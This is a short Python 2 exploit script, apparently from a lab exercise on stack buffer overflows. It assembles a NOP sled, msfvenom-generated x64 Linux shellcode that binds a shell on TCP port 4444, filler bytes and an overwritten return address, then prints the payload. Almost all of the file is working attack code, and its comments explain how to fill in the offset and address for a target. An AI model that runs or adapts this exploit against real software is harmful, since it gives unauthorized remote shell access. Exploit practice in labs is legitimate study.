
#!/usr/bin/python
#check python version with python --version. If it is 3, use this script with command python2

from struct import pack

#change [a] to a real value that you found
filling_len = 520
#change [add] to ral memory address that you found
rip = 0x7fffffffe058

#nop, we will add instruction to move forward to the beginning of the input
nop = "\x90"*200

#generate malicious code with msfvenom and copy it here as buf
#msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -b '\x00' -f python

#buf =  b""
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\xe9\x14\x7e\xd8\x0d"
buf += b"\x5b\xb1\x36\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x83\x3d\x26\x41\x67\x59\xee\x5c\xe8"
buf += b"\x4a\x71\xdd\x45\xcc\xe3\xf1\xed\x30\x7c\xd8\x1c"
buf += b"\x07\xf9\xbf\x0f\x7e\x6e\x82\x67\x6a\xe9\x39\xec"
buf += b"\x7e\x4c\x80\x02\x5e\xf9\x07\x1f\x7e\x55\x80\x02"
buf += b"\x5e\xf9\xa1\x83\x17\x20\x90\xf2\x95\xdb\x17\xb1"
buf += b"\x1b\x7b\xad\xfb\x31\x8a\x6e\x70\x5c\xc5\xf7\x6f"
buf += b"\x32\xdf\x19\x9a\x7c\x7e\x8b\x45\xd2\x56\x64\xbe"
buf += b"\x5c\xf7\x3e\x02\x5e\xb1\x36"

#create the final string of characters
buf_len = len(buf)
nop_len = len(nop)
filling = "A" * (filling_len - nop_len - buf_len)

i = nop + buf + filling + pack("<Q", rip)

print i

